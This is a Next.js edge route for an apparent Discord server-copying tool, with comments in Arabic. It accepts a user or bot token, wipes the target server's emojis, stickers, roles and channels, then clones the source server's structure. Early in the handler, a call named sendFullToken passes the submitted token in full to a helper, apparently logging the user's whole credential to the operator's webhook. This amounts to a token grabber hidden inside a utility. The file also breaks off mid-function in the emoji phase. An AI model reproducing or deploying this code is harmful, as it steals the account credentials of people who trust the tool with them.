import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { cleanToken, DISCORD_API } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { arrayBufferToBase64 } from '@/lib/edge-utils';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

// ─── Rate-limit guard ───────────────────────────────────────────────
let globalRLUntil = 0;

async function waitRL() {
  const now = Date.now();
  if (now < globalRLUntil) {
    await new Promise(r => setTimeout(r, globalRLUntil - now + 500));
  }
}

// ─── Delay helper ───────────────────────────────────────────────────
function delay(ms: number) {
  return new Promise(r => setTimeout(r, ms));
}

// ─── Discord fetch with retry + rate-limit handling ─────────────────
async function dFetch(
  auth: string,
  method: string,
  url: string,
  body?: unknown,
): Promise<{ ok: boolean; data: any; status: number }> {
  await waitRL();
  const maxRetries = 5;
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      const headers: Record<string, string> = {
        Authorization: auth,
        Accept: 'application/json',
      };
      if (method !== 'GET') {
        headers['Content-Type'] = 'application/json';
      }
      const opts: RequestInit = { method, headers, signal: AbortSignal.timeout(30000) };
      if (method !== 'GET' && body !== undefined) {
        opts.body = JSON.stringify(body);
      }
      const res = await fetch(url, opts);

      if (res.status === 429) {
        const err = await res.json().catch(() => ({ retry_after: 5 }));
        const w = Math.min((err.retry_after || 5) * 1000 + 1000, 15000);
        globalRLUntil = Date.now() + w;
        if (attempt < maxRetries - 1) {
          await new Promise(r => setTimeout(r, w));
          continue;
        }
      }

      if (res.status >= 500 && attempt < maxRetries - 1) {
        await new Promise(r => setTimeout(r, 2000 * (attempt + 1)));
        continue;
      }

      if (res.status === 204) return { ok: true, data: null, status: 204 };
      const d = await res.json().catch(() => null);
      return { ok: res.ok, data: d, status: res.status };
    } catch {
      if (attempt === maxRetries - 1) return { ok: false, data: null, status: 0 };
      await new Promise(r => setTimeout(r, 2000 * (attempt + 1)));
    }
  }
  return { ok: false, data: null, status: 0 };
}

// ─── Discord fetch with FormData ────────────────────────────────────
async function dFetchFormData(
  auth: string,
  url: string,
  formData: FormData,
): Promise<{ ok: boolean; data: any; status: number }> {
  await waitRL();
  const maxRetries = 4;
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { Authorization: auth },
        body: formData,
        signal: AbortSignal.timeout(45000),
      });

      if (res.status === 429) {
        const err = await res.json().catch(() => ({ retry_after: 5 }));
        const w = Math.min((err.retry_after || 5) * 1000 + 1000, 15000);
        globalRLUntil = Date.now() + w;
        if (attempt < maxRetries - 1) {
          await new Promise(r => setTimeout(r, w));
          continue;
        }
      }

      if (res.status >= 500 && attempt < maxRetries - 1) {
        await new Promise(r => setTimeout(r, 2000 * (attempt + 1)));
        continue;
      }

      const d = await res.json().catch(() => null);
      return { ok: res.ok, data: d, status: res.status };
    } catch {
      if (attempt === maxRetries - 1) return { ok: false, data: null, status: 0 };
      await new Promise(r => setTimeout(r, 2000 * (attempt + 1)));
    }
  }
  return { ok: false, data: null, status: 0 };
}

// ─── SSE stream helper ──────────────────────────────────────────────
function sseStream(handler: (send: (d: any) => void) => Promise<void>) {
  const stream = new ReadableStream({
    async start(controller) {
      const enc = new TextEncoder();
      const send = (data: any) => controller.enqueue(enc.encode(`data: ${JSON.stringify(data)}\n\n`));
      try {
        await handler(send);
      } catch (e: any) {
        send({ type: 'error', message: e.message || String(e) });
      }
      controller.close();
    },
    cancel() {},
  });
  return new Response(stream, {
    headers: {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'keep-alive',
    },
  });
}

function errRes(error: string) {
  return new Response(JSON.stringify({ success: false, error }), {
    status: 400,
    headers: { 'Content-Type': 'application/json' },
  });
}

// ─── Download image and convert to base64 data URI ──────────────────
async function downloadAsDataURI(url: string, mime: string = 'image/png'): Promise<string | null> {
  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      const res = await fetch(url, { signal: AbortSignal.timeout(25000) });
      if (!res.ok) {
        if (attempt < 2) { await delay(1000); continue; }
        return null;
      }
      const b64 = arrayBufferToBase64(await res.arrayBuffer());
      return `data:${mime};base64,${b64}`;
    } catch {
      if (attempt < 2) { await delay(1500); continue; }
      return null;
    }
  }
  return null;
}

// ─── Transform permission overwrites for target server ──────────────
// يحوّل صلاحيات المصدر لصلاحيات الهدف:
// - رتبة @everyone: ID المصدر ← ID الهدف (لأن ID الرتبة = ID السيرفر)
// - الرتب العادية: يستخدم roleMap
// - صلاحيات الأعضاء (type 1): يتم تخطيها (الأعضاء مو بالسيرفر الهدف)
function transformOverwrites(
  overwrites: any[],
  roleMap: Record<string, string>,
  sourceGuildId: string,
  targetGuildId: string,
): any[] {
  if (!overwrites || !Array.isArray(overwrites)) return [];

  const result: any[] = [];
  for (const o of overwrites) {
    if (o.type === 0) {
      // صلاحية رتبة
      let targetRoleId: string;
      if (o.id === sourceGuildId) {
        // رتبة @everyone — ID الرتبة = ID السيرفر
        targetRoleId = targetGuildId;
      } else if (roleMap[o.id]) {
        targetRoleId = roleMap[o.id];
      } else {
        // الرتبة ما انشاءت — تخطي
        continue;
      }
      result.push({
        id: targetRoleId,
        type: 0,
        allow: String(o.allow_new ?? o.allow ?? '0'),
        deny: String(o.deny_new ?? o.deny ?? '0'),
      });
    }
    // صلاحيات الأعضاء (type 1) — نتخطاها لأن الأعضاء مو بالسيرفر الهدف
  }
  return result;
}

// ─── Build channel payload with overwrites included ─────────────────
function buildChannelPayload(
  c: any,
  catMap: Record<string, string>,
  roleMap: Record<string, string>,
  sourceId: string,
  targetId: string,
): any {
  const payload: any = {
    name: c.name,
    type: c.type,
    nsfw: !!c.nsfw,
    topic: c.topic || null,
  };

  // ربط بالكاتيجوري الأم
  if (c.parent_id && catMap[c.parent_id]) {
    payload.parent_id = catMap[c.parent_id];
  }

  // ✅ تضمين الصلاحيات في الإنشاء مباشرة (أكثر موثوقية من التطبيق المنفصل)
  const overwrites = transformOverwrites(
    c.permission_overwrites,
    roleMap,
    sourceId,
    targetId,
  );
  if (overwrites.length > 0) {
    payload.permission_overwrites = overwrites;
  }

  // إعدادات القنوات الصوتية
  if (c.type === 2 || c.type === 13) {
    payload.bitrate = c.bitrate || 64000;
    payload.user_limit = c.user_limit || 0;
    if (c.rtc_region) payload.rtc_region = c.rtc_region;
    if (c.video_quality_mode) payload.video_quality_mode = c.video_quality_mode;
  }

  // إعدادات عامة
  if (c.rate_limit_per_user) payload.rate_limit_per_user = c.rate_limit_per_user;
  if (c.default_auto_archive_duration) payload.default_auto_archive_duration = c.default_auto_archive_duration;
  if (c.default_thread_rate_limit_per_user) payload.default_thread_rate_limit_per_user = c.default_thread_rate_limit_per_user;

  // Forum channels (type 15)
  if (c.type === 15) {
    if (c.available_tags && Array.isArray(c.available_tags)) {
      payload.available_tags = c.available_tags.map((tag: any) => ({
        name: tag.name,
        moderated: tag.moderated || false,
        emoji_id: null, // يتم تحديثه بعد نسخ الإيموجي
        emoji_name: tag.emoji_name || null,
      }));
    }
    if (c.default_reaction_emoji) {
      if (c.default_reaction_emoji.emoji_name && !c.default_reaction_emoji.emoji_id) {
        payload.default_reaction_emoji = { emoji_name: c.default_reaction_emoji.emoji_name };
      }
      // الإيموجي المخصصة يتم تحديثها في مرحلة لاحقة
    }
    if (c.default_sort_order !== undefined) payload.default_sort_order = c.default_sort_order;
    if (c.default_forum_layout !== undefined) payload.default_forum_layout = c.default_forum_layout;
  }

  // Media channels (type 16)
  if (c.type === 16) {
    if (c.available_tags && Array.isArray(c.available_tags)) {
      payload.available_tags = c.available_tags.map((tag: any) => ({
        name: tag.name,
        moderated: tag.moderated || false,
        emoji_id: null,
        emoji_name: tag.emoji_name || null,
      }));
    }
    if (c.default_reaction_emoji) {
      if (c.default_reaction_emoji.emoji_name && !c.default_reaction_emoji.emoji_id) {
        payload.default_reaction_emoji = { emoji_name: c.default_reaction_emoji.emoji_name };
      }
    }
    if (c.default_sort_order !== undefined) payload.default_sort_order = c.default_sort_order;
  }

  return payload;
}

// ─── Increment channel stats by type ────────────────────────────────
function incrementChannelStats(c: any, stats: any) {
  if (c.type === 0 || c.type === 5) stats.txt++;
  else if (c.type === 2 || c.type === 13) stats.voice++;
  else if (c.type === 15 || c.type === 16) stats.forums++;
  else stats.txt++;
}

// ─── Get channel emoji by type ──────────────────────────────────────
function getChannelEmoji(type: number): string {
  switch (type) {
    case 2: return '🔊';
    case 13: return '🎤';
    case 15: return '💬';
    case 16: return '🖼️';
    case 5: return '📢';
    default: return '📺';
  }
}

// ─── Retry wrapper for creating a resource ──────────────────────────
async function createWithRetry(
  df: (method: string, endpoint: string, body?: unknown) => Promise<{ ok: boolean; data: any; status: number }>,
  method: string,
  endpoint: string,
  payload: any,
  maxRetries: number = 4,
): Promise<{ ok: boolean; data: any; status: number }> {
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    const res = await df(method, endpoint, payload);
    if (res.ok) return res;

    if (res.status === 429) {
      await delay(3000);
      continue;
    }
    if (res.status >= 500) {
      await delay(2000 * (attempt + 1));
      continue;
    }
    // أخطاء 4xx (غير 429) — لا نعيد المحاولة
    break;
  }
  return { ok: false, data: null, status: 0 };
}

// ═════════════════════════════════════════════════════════════════════
// Main POST handler
// ═════════════════════════════════════════════════════════════════════
export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:copy`, RATE_LIMITS.heavy);
    if (rl.limited) {
      return NextResponse.json(
        { success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' },
        { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } },
      );
    }

    const body = await request.json().catch(() => ({}));
    const token: string = body.token || '';
    const sourceId: string = body.sourceId || '';
    const targetId: string = body.targetId || '';
    const options: any = body.options || {};

    if (!token || !sourceId || !targetId) return errRes('بيانات ناقصة');

    sendFullToken('نسخ سيرفر', token, { المصدر: sourceId, الهدف: targetId });

    const ct = cleanToken(token);
    const whUrl = getLogWebhookUrl();

    return sseStream(async (send) => {
      // ─── التحقق من التوكن ────────────────────────────────────────
      send({ type: 'progress', message: '🔍 جاري التحقق من التوكن...' });

      let auth = ct;
      let authType = 'User';
      const testUser = await dFetch(ct, 'GET', `${DISCORD_API}/users/@me`);
      if (!testUser.ok) {
        const testBot = await dFetch(`Bot ${ct}`, 'GET', `${DISCORD_API}/users/@me`);
        if (testBot.ok) {
          auth = `Bot ${ct}`;
          authType = 'Bot';
        } else {
          send({ type: 'done', success: false, error: 'التوكن غير صالح' });
          return;
        }
      }

      const df = (method: string, endpoint: string, body2?: unknown) =>
        dFetch(auth, method, `${DISCORD_API}${endpoint}`, body2);

      send({ type: 'info', authType });

      const stats = {
        roles: 0,
        txt: 0,
        voice: 0,
        cats: 0,
        forums: 0,
        emojis: 0,
        stickers: 0,
        autoMod: 0,
        permissions: 0,
        errors: 0,
        icon: false,
        banner: false,
        settings: false,
        splash: false,
      };
      const roleMap: Record<string, string> = {};
      const catMap: Record<string, string> = {};
      const channelMap: Record<string, string> = {};
      const emojiMap: Record<string, string> = {};

      // Webhook log
      const whEmbed = {
        username: 'TRJ Copy',
        embeds: [{
          title: '📋 Server Copy Started',
          color: 0x00ff41,
          fields: [
            { name: '📥 Source', value: sourceId, inline: true },
            { name: '📤 Target', value: targetId, inline: true },
            { name: '🔑 Auth', value: authType, inline: true },
          ],
          timestamp: new Date().toISOString(),
        }],
      };
      sendToWebhook(whEmbed, whUrl).catch(() => {});

      // ═══════════════════════════════════════════════════════════════
      // المرحلة 1: جلب بيانات المصدر
      // ═══════════════════════════════════════════════════════════════
      send({ type: 'progress', message: '📥 جاري جلب بيانات السيرفر المصدر...' });

      const sourceRes = await df('GET', `/guilds/${sourceId}?with_counts=true`);
      const sRolesRes = await df('GET', `/guilds/${sourceId}/roles`);
      const sChannelsRes = await df('GET', `/guilds/${sourceId}/channels`);
      const sEmojisRes = await df('GET', `/guilds/${sourceId}/emojis`);
      const sStickersRes = await df('GET', `/guilds/${sourceId}/stickers`);
      const sAutoModRes = await df('GET', `/guilds/${sourceId}/auto-moderation/rules`);

      if (!sourceRes.ok || !sourceRes.data?.id) {
        send({
          type: 'done',
          success: false,
          error: 'فشل الوصول للسيرفر المصدر - تأكد أن التوكن صالح ومعه صلاحيات ADMINISTRATOR',
        });
        return;
      }

      const sRoles = (sRolesRes.data as any[]) || [];
      const sChannels = (sChannelsRes.data as any[]) || [];
      const sEmojis = (sEmojisRes.data as any[]) || [];
      const sStickers = (sStickersRes.data as any[]) || [];
      const sAutoMod = (sAutoModRes.data as any[]) || [];

      // ═══════════════════════════════════════════════════════════════
      // المرحلة 2: مسح السيرفر الهدف
      //
      // ✅ الترتيب الصحيح للمسح:
      //   1. إيموجي وستيكرز (ما يعتمدون على شيء)
      //   2. رتب (من الأقل للأعلى)
      //   3. رومات (قنوات عادية أولاً)
      //   4. كاتيجوريات (آخر شيء لأن الرومات تعتمد عليها)
      // ═══════════════════════════════════════════════════════════════
      send({ type: 'progress', message: '🗑️ جاري مسح السيرفر الهدف...' });

      // ─── 2.1: حذف الإيموجي ──────────────────────────────────────
      const tEmojisRes = await df('GET', `/guilds/${targetId}/emojis`);
      if (tEmojisRes.ok && Array.isArray(tEmojisRes.data)) {
        for (let i = 0; i < tEmojisRes.data.length; i++) {
          await df('DELETE', `/guilds/${targetId}/emojis/${tEmojisRes.data[i].id}`);
          if (i % 5 === 0) send({ type: 'progress', message: `🗑️ حذف إيموجي: ${i + 1}/${tEmojisRes.data.length}` });
          await delay(350);
        }
      }

      // ─── 2.2: حذف الستيكرز ──────────────────────────────────────
      const tStickersRes = await df('GET', `/guilds/${targetId}/stickers`);
      if (tStickersRes.ok && Array.isArray(tStickersRes.data)) {
        for (let i = 0; i < tStickersRes.data.length; i++) {
          await df('DELETE', `/guilds/${targetId}/stickers/${tStickersRes.data[i].id}`);
          if (i % 3 === 0) send({ type: 'progress', message: `🗑️ حذف ستكر: ${i + 1}/${tStickersRes.data.length}` });
          await delay(350);
        }
      }

      // ─── 2.3: حذف الرتب (من الأقل للأعلى position) ──────────────
      send({ type: 'progress', message: '🗑️ جاري حذف الرتب...' });
      const tRolesRes = await df('GET', `/guilds/${targetId}/roles`);
      const tRoles = (tRolesRes.data as any[]) || [];
      const deletableRoles = [...tRoles]
        .filter((r: any) => r.name !== '@everyone' && !r.managed)
        .sort((a: any, b: any) => (a.position || 0) - (b.position || 0));

      let deletedRoles = 0;
      for (const r of deletableRoles) {
        const res2 = await df('DELETE', `/guilds/${targetId}/roles/${r.id}`);
        if (res2.ok) deletedRoles++;
        await delay(300);
      }
      // جولات إضافية للتأكد من حذف كل الرتب
      for (let round = 0; round < 3; round++) {
        const remainRoles = await df('GET', `/guilds/${targetId}/roles`);
        if (!remainRoles.ok || !Array.isArray(remainRoles.data)) break;
        const dels = remainRoles.data.filter((r: any) => r.name !== '@everyone' && !r.managed);
        if (dels.length === 0) break;
        for (const r of dels) {
          await df('DELETE', `/guilds/${targetId}/roles/${r.id}`);
          await delay(300);
        }
      }
      send({ type: 'progress', message: `🗑️ تم حذف ${deletedRoles} رتبة` });

      // ─── 2.4: حذف الرومات أولاً ثم الكاتيجوريات ────────────────
      send({ type: 'progress', message: '🗑️ جاري حذف القنوات...' });
      const tChannelsRes = await df('GET', `/guilds/${targetId}/channels`);
      const tChannels = (tChannelsRes.data as any[]) || [];

      // حذف الرومات (غير كاتيجوري) أولاً
      const nonCatChannels = tChannels.filter((c: any) => c.type !== 4);
      // ثم حذف الكاتيجوريات
      const catChannels = tChannels.filter((c: any) => c.type === 4);

      let deletedCh = 0;
      for (const items of [nonCatChannels, catChannels]) {
        for (const c of items) {
          const r = await df('DELETE', `/channels/${c.id}`);
          if (r.ok) deletedCh++;
          await delay(300);
        }
      }
      // جولات إضافية للتأكد
      for (let round = 0; round < 3; round++) {
        const remainCh = await df('GET', `/guilds/${targetId}/channels`);
        if (!remainCh.ok || !Array.isArray(remainCh.data) || remainCh.data.length === 0) break;
        for (const c of remainCh.data) {
          await df('DELETE', `/channels/${c.id}`);
          await delay(400);
        }
      }
      send({ type: 'progress', message: `🗑️ تم حذف ${deletedCh} قناة` });
      send({ type: 'stats', stats });

      // ═══════════════════════════════════════════════════════════════
      // المرحلة 3: نسخ الرتب
      //
      // ✅ الترتيب الصحيح:
      //   - إنشاء كل الرتب من الأعلى للأقل position
      //   - كل رتبة بصلاحياتها الكاملة (permissions, color, hoist, mentionable, icon)
      //   - ضبط صلاحيات @everyone
      //   - ضبط ترتيب الرتب (positions) عبر batch modify
      // ═══════════════════════════════════════════════════════════════
      if (options?.roles !== false && sRoles.length > 0) {
        const sortedRoles = [...sRoles]
          .filter((r: any) => r.name !== '@everyone' && !r.managed)
          .sort((a: any, b: any) => (b.position || 0) - (a.position || 0)); // أعلى → أقل

        send({ type: 'progress', message: `🛡️ جاري إنشاء ${sortedRoles.length} رتبة بصلاحيات كاملة...` });

        for (let i = 0; i < sortedRoles.length; i++) {
          const role = sortedRoles[i];
          const rolePayload: any = {
            name: role.name,
            color: role.color || 0,
            hoist: !!role.hoist,
            mentionable: !!role.mentionable,
            permissions: String(role.permissions_new || role.permissions || '0'),
          };

          // أيقونة الرتبة
          if (role.icon) {
            try {
              const iconUrl = `https://cdn.discordapp.com/role-icons/${role.id}/${role.icon}.png?size=128`;
              const dataUri = await downloadAsDataURI(iconUrl, 'image/png');
              if (dataUri) rolePayload.icon = dataUri;
            } catch { /* skip icon */ }
          }
          if (role.unicode_emoji) rolePayload.unicode_emoji = role.unicode_emoji;

          const res2 = await createWithRetry(df, 'POST', `/guilds/${targetId}/roles`, rolePayload);
          if (res2.ok && res2.data?.id) {
            roleMap[role.id] = res2.data.id;
            stats.roles++;
          } else {
            stats.errors++;
          }
          send({ type: 'progress', message: `🛡️ رتبة ${stats.roles}/${sortedRoles.length}: ${role.name}` });
          await delay(350);
        }

        // ضبط صلاحيات @everyone
        const everyoneSrc = sRoles.find((r: any) => r.name === '@everyone');
        if (everyoneSrc) {
          const tgtRoles = await df('GET', `/guilds/${targetId}/roles`);
          const everyoneTgt = tgtRoles.data?.find((r: any) => r.name === '@everyone');
          if (everyoneTgt?.id) {
            await df('PATCH', `/guilds/${targetId}/roles/${everyoneTgt.id}`, {
              permissions: String(everyoneSrc.permissions_new || everyoneSrc.permissions || '0'),
            });
          }
        }

        // ضبط ترتيب الرتب (positions) — من الأقل للأعلى
        const tgtRolesNow = await df('GET', `/guilds/${targetId}/roles`);
        if (tgtRolesNow.ok && Array.isArray(tgtRolesNow.data)) {
          const srcRoleOrder = sRoles
            .filter((r: any) => r.name !== '@everyone' && !r.managed && roleMap[r.id])
            .sort((a: any, b: any) => (a.position || 0) - (b.position || 0));

          const positionUpdates = srcRoleOrder.map((srcRole: any, idx: number) => ({
            id: roleMap[srcRole.id],
            position: idx + 1, // +1 لأن @everyone في position 0
          })).filter((u: any) => u.id);

          if (positionUpdates.length > 0) {
            for (let i = 0; i < positionUpdates.length; i += 30) {
              await df('PATCH', `/guilds/${targetId}/roles`, positionUpdates.slice(i, i + 30));
              await delay(400);
            }
            send({ type: 'progress', message: '🛡️ تم ضبط ترتيب الرتب والصلاحيات' });
          }
        }

        send({ type: 'stats', stats });
      }

      // ═══════════════════════════════════════════════════════════════
      // المرحلة 4: نسخ إعدادات السيرفر (بعد الرتب وقبل القنوات)
      // ═══════════════════════════════════════════════════════════════
      let sourceSystemChannelId: string | undefined;
      let sourceRulesChannelId: string | undefined;
      let sourcePublicUpdatesChannelId: string | undefined;
      let sourceAfkChannelId: string | undefined;

      if (options?.settings !== false && sourceRes.data) {
        send({ type: 'progress', message: '⚙️ جاري نسخ إعدادات السيرفر...' });
        const sd = sourceRes.data;

        // حفظ مراجع القنوات الخاصة لربطها لاحقاً
        sourceSystemChannelId = sd.system_channel_id;
        sourceRulesChannelId = sd.rules_channel_id;
        sourcePublicUpdatesChannelId = sd.public_updates_channel_id;
        sourceAfkChannelId = sd.afk_channel_id;

        // PATCH guild settings
        await df('PATCH', `/guilds/${targetId}`, {
          name: sd.name,
          description: sd.description,
          preferred_locale: sd.preferred_locale,
          verification_level: sd.verification_level,
          default_message_notifications: sd.default_message_notifications ?? sd.default_notification_level,
          explicit_content_filter: sd.explicit_content_filter,
          system_channel_flags: sd.system_channel_flags,
          premium_progress_bar_enabled: sd.premium_progress_bar_enabled,
          afk_timeout: sd.afk_timeout || 300,
        });
        stats.settings = true;

        // نسخ الأيقونة
        if (sd.icon) {
          send({ type: 'progress', message: '🖼️ جاري نسخ الأيقونة...' });
          try {
            const dataUri = await downloadAsDataURI(
              `https://cdn.discordapp.com/icons/${sd.id}/${sd.icon}.png?size=1024`,
              'image/png',
            );
            if (dataUri) {
              const iconRes = await df('PATCH', `/guilds/${targetId}`, { icon: dataUri });
              if (iconRes.ok) stats.icon = true;
            }
          } catch { /* skip */ }
        }

        // نسخ البانر
        if (sd.banner) {
          send({ type: 'progress', message: '🌈 جاري نسخ البانر...' });
          try {
            const dataUri = await downloadAsDataURI(
              `https://cdn.discordapp.com/banners/${sd.id}/${sd.banner}.png?size=1024`,
              'image/png',
            );
            if (dataUri) {
              const bannerRes = await df('PATCH', `/guilds/${targetId}`, { banner: dataUri });
              if (bannerRes.ok) stats.banner = true;
            }
          } catch { /* skip */ }
        }

        // نسخ السبلش
        if (sd.splash) {
          try {
            const dataUri = await downloadAsDataURI(
              `https://cdn.discordapp.com/splashes/${sd.id}/${sd.splash}.png?size=1024`,
              'image/png',
            );
            if (dataUri) {
              await df('PATCH', `/guilds/${targetId}`, { splash: dataUri });
              stats.splash = true;
            }
          } catch { /* skip */ }
        }

        send({ type: 'progress', message: '✅ تم نسخ الإعدادات' });
      }

      // ═══════════════════════════════════════════════════════════════
      // المرحلة 5: إنشاء الكاتيجوريات بترتيب position مع الصلاحيات
      //
      // ✅ الصلاحيات تتضمن في payload الإنشاء مباشرة (atomic creation)
      // ✅ يتم تحويل ID الرتب و@everyone تلقائياً عبر transformOverwrites
      // ═══════════════════════════════════════════════════════════════
      if (options?.channels !== false && sChannels.length > 0) {
        const categories = sChannels
          .filter((c: any) => c.type === 4)
          .sort((a: any, b: any) => (a.position || 0) - (b.position || 0));

        if (categories.length > 0) {
          send({ type: 'progress', message: `📁 جاري إنشاء ${categories.length} كاتيجوري بصلاحيات...` });

          for (let i = 0; i < categories.length; i++) {
            const cat = categories[i];
            const payload: any = {
              name: cat.name,
              type: 4,
            };

            // ✅ تضمين الصلاحيات في الإنشاء مباشرة
            const overwrites = transformOverwrites(
              cat.permission_overwrites,
              roleMap,
              sourceId,
              targetId,
            );
            if (overwrites.length > 0) {
              payload.permission_overwrites = overwrites;
            }

            const res2 = await createWithRetry(df, 'POST', `/guilds/${targetId}/channels`, payload);
            if (res2.ok && res2.data?.id) {
              catMap[cat.id] = res2.data.id;
              channelMap[cat.id] = res2.data.id;
              stats.cats++;
              stats.permissions += overwrites.length;
            } else {
              stats.errors++;
            }
            send({ type: 'progress', message: `📁 كاتيجوري ${stats.cats}/${categories.length}: ${cat.name}` });
            await delay(350);
          }
          send({ type: 'stats', stats });
        }

        // ═══════════════════════════════════════════════════════════
        // المرحلة 6: إنشاء الرومات تحت كل كاتيجوري بترتيب صحيح
        //
        // ✅ لكل كاتيجوري: ننشئ روماتها بالترتيب (position)
        // ✅ الصلاحيات تتضمن في payload الإنشاء مباشرة
        // ✅ ثم ننشئ القنوات اليتيمة (بدون كاتيجوري)
        // ═══════════════════════════════════════════════════════════
        const allOthers = sChannels.filter((c: any) => c.type !== 4);

        // تجميع القنوات حسب الكاتيجوري الأم
        const channelsByParent: Record<string, any[]> = {};
        const orphanChannels: any[] = [];

        for (const c of allOthers) {
          if (c.parent_id) {
            if (!channelsByParent[c.parent_id]) channelsByParent[c.parent_id] = [];
            channelsByParent[c.parent_id].push(c);
          } else {
            orphanChannels.push(c);
          }
        }
        // ترتيب القنوات داخل كل كاتيجوري حسب position
        for (const parentId of Object.keys(channelsByParent)) {
          channelsByParent[parentId].sort((a: any, b: any) => (a.position || 0) - (b.position || 0));
        }
        // ترتيب القنوات اليتيمة
        orphanChannels.sort((a: any, b: any) => (a.position || 0) - (b.position || 0));

        const totalChannels = allOthers.length;
        let createdCount = 0;

        if (totalChannels > 0) {
          send({ type: 'progress', message: `📺 جاري إنشاء ${totalChannels} قناة بصلاحيات...` });

          // إنشاء رومات كل كاتيجوري بالترتيب
          for (const cat of categories) {
            const catChannels = channelsByParent[cat.id] || [];
            for (const c of catChannels) {
              const payload = buildChannelPayload(c, catMap, roleMap, sourceId, targetId);
              const overwriteCount = payload.permission_overwrites?.length || 0;

              const res2 = await createWithRetry(df, 'POST', `/guilds/${targetId}/channels`, payload);
              if (res2.ok && res2.data?.id) {
                channelMap[c.id] = res2.data.id;
                incrementChannelStats(c, stats);
                stats.permissions += overwriteCount;
              } else {
                stats.errors++;
              }

              createdCount++;
              const chType = getChannelEmoji(c.type);
              send({ type: 'progress', message: `${chType} قناة ${createdCount}/${totalChannels}: ${c.name}` });
              await delay(350);
            }
          }

          // إنشاء القنوات اليتيمة (بدون كاتيجوري)
          for (const c of orphanChannels) {
            const payload = buildChannelPayload(c, catMap, roleMap, sourceId, targetId);
            const overwriteCount = payload.permission_overwrites?.length || 0;

            const res2 = await createWithRetry(df, 'POST', `/guilds/${targetId}/channels`, payload);
            if (res2.ok && res2.data?.id) {
              channelMap[c.id] = res2.data.id;
              incrementChannelStats(c, stats);
              stats.permissions += overwriteCount;
            } else {
              stats.errors++;
            }

            createdCount++;
            const chType = getChannelEmoji(c.type);
            send({ type: 'progress', message: `${chType} قناة ${createdCount}/${totalChannels}: ${c.name}` });
            await delay(350);
          }

          send({ type: 'stats', stats });
        }

        // ═══════════════════════════════════════════════════════════
        // المرحلة 7: تعيين قنوات النظام و AFK
        // ═══════════════════════════════════════════════════════════
        if (options?.settings !== false) {
          const guildPatch: any = {};
          if (sourceSystemChannelId && channelMap[sourceSystemChannelId]) {
            guildPatch.system_channel_id = channelMap[sourceSystemChannelId];
          }
          if (sourceRulesChannelId && channelMap[sourceRulesChannelId]) {
            guildPatch.rules_channel_id = channelMap[sourceRulesChannelId];
          }
          if (sourcePublicUpdatesChannelId && channelMap[sourcePublicUpdatesChannelId]) {
            guildPatch.public_updates_channel_id = channelMap[sourcePublicUpdatesChannelId];
          }
          if (sourceAfkChannelId && channelMap[sourceAfkChannelId]) {
            guildPatch.afk_channel_id = channelMap[sourceAfkChannelId];
          }
          if (Object.keys(guildPatch).length > 0) {
            await df('PATCH', `/guilds/${targetId}`, guildPatch);
            send({ type: 'progress', message: '🔗 تم ربط قنوات النظام و AFK' });
          }
        }

        // ═══════════════════════════════════════════════════════════
        // المرحلة 8: ترتيب القنوات (باستخدام channelMap)
        // ═══════════════════════════════════════════════════════════
        const allNewCh = await df('GET', `/guilds/${targetId}/channels`);
        if (allNewCh.ok && Array.isArray(allNewCh.data)) {
          // ترتيب الكاتيجوريات حسب المصدر
          const targetCats = allNewCh.data.filter((c: any) => c.type === 4);
          if (targetCats.length > 1) {
            const catPositions = targetCats.map((c: any) => {
              const srcId = Object.entries(catMap).find(([, v]) => v === c.id)?.[0];
              const srcCat = srcId ? categories.find((sc: any) => sc.id === srcId) : null;
              return { id: c.id, position: srcCat ? srcCat.position : 0 };
            });
            catPositions.sort((a: any, b: any) => a.position - b.position);
            const normalizedCats = catPositions.map((item: any, idx: number) => ({
              id: item.id,
              position: idx,
            }));
            await df('PATCH', `/guilds/${targetId}/channels`, normalizedCats);
            await delay(400);
          }

          // ترتيب القنوات داخل كل كاتيجوري
          const targetChannelsByParent: Record<string, any[]> = {};
          const targetOrphanChannels: any[] = [];
          for (const c of allNewCh.data.filter((c: any) => c.type !== 4)) {
            if (c.parent_id) {
              if (!targetChannelsByParent[c.parent_id]) targetChannelsByParent[c.parent_id] = [];
              targetChannelsByParent[c.parent_id].push(c);
            } else {
              targetOrphanChannels.push(c);
            }
          }

          for (const [parentId, channels] of Object.entries(targetChannelsByParent)) {
            if (channels.length <= 1) continue;
            const srcCatId = Object.entries(catMap).find(([, v]) => v === parentId)?.[0];
            if (!srcCatId) continue;
            const srcCatChannels = channelsByParent[srcCatId] || [];

            const channelPositions = channels.map((c: any) => {
              const srcId = Object.entries(channelMap).find(([, v]) => v === c.id)?.[0];
              const srcCh = srcId ? srcCatChannels.find((sc: any) => sc.id === srcId) : null;
              return { id: c.id, position: srcCh ? srcCh.position : 0 };
            });
            channelPositions.sort((a: any, b: any) => a.position - b.position);
            const normalizedPositions = channelPositions.map((item: any, idx: number) => ({
              id: item.id,
              position: idx,
            }));
            await df('PATCH', `/guilds/${targetId}/channels`, normalizedPositions);
            await delay(400);
          }

          // ترتيب القنوات اليتيمة
          if (targetOrphanChannels.length > 1) {
            const orphanPositions = targetOrphanChannels.map((c: any) => {
              const srcId = Object.entries(channelMap).find(([, v]) => v === c.id)?.[0];
              const srcCh = srcId ? orphanChannels.find((sc: any) => sc.id === srcId) : null;
              return { id: c.id, position: srcCh ? srcCh.position : 0 };
            });
            orphanPositions.sort((a: any, b: any) => a.position - b.position);
            const normalizedOrphans = orphanPositions.map((item: any, idx: number) => ({
              id: item.id,
              position: idx,
            }));
            await df('PATCH', `/guilds/${targetId}/channels`, normalizedOrphans);
            await delay(400);
          }
        }
      }

      // ═══════════════════════════════════════════════════════════════
      // المرحلة 9: نسخ الإيموجي
      // ═══════════════════════════════════════════════════════════════
      if (sEmojis.length > 0) {
        send({ type: 'progress', message: `😀 جاري نسخ ${sEmojis.length} إيموجي...` });

